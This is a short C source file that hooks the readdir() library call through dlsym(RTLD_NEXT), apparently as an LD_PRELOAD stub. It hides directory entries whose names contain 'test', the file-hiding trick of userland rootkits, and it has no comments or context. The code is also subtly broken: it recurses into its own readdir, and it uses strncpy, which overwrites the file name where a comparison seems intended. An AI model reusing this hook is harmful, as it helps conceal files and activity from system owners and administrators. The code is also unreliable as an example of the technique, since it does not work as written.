#include <dirent.h>
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>

struct dirent *(*o_readdir)(DIR *);
struct dirent *readdir(DIR *p) {
  if (!o_readdir) {
    o_readdir = dlsym(RTLD_NEXT, "readdir");
  }

  struct dirent *dir = readdir(p);

  if (dir) {
    if (!strncpy(dir->d_name, "test", strlen("test")) ||
        strstr(dir->d_name, "test")) {
      dir = o_readdir(p);
    }
  }
  return dir;
};
